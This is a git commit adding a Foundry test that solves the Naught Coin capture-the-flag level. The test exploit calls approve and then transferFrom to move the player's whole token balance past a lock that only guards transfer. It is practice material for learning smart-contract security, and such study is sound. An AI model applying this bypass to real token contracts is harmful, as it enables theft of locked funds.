3e43d1ab4e83ead640f7eb81aeec9daf2e7c3d9e
bentobox19.eth <bentobox19@protonmail.com>
2022-07-15 01:59:17 -0400

    add 15-naught-coin

--- test/15-naught-coin/NaughtCoin.t.sol
+++ test/15-naught-coin/NaughtCoin.t.sol
@@ -4,15 +4,28 @@ pragma solidity >=0.8.0;
 import "forge-std/Test.sol";
 import "../utils.sol";
 
+// there are no modifiers on the methods approve or transferFrom
+interface INaughtCoin {
+  function balanceOf(address account) external returns (uint256);
+  function approve(address spender, uint256 amount) external returns (bool);
+  function transferFrom(address from, address to, uint256 value) external returns(bool);
+}
+
 contract NaughtCoinTest is Test {
   address internal challengeAddress;
+  INaughtCoin internal nc;
 
   function setUp() public {
     challengeAddress = utils.createLevelInstance(0x096bb5e93a204BfD701502EB6EF266a950217218);
+    nc = INaughtCoin(challengeAddress);
   }
 
   function testExploit() public {
+    uint256 balance = nc.balanceOf(address(this));
 
-    // utils.submitLevelInstance(challengeAddress);
+    nc.approve(address(this), balance);
+    nc.transferFrom(address(this), tx.origin, balance);
+
+    utils.submitLevelInstance(challengeAddress);
   }
 }
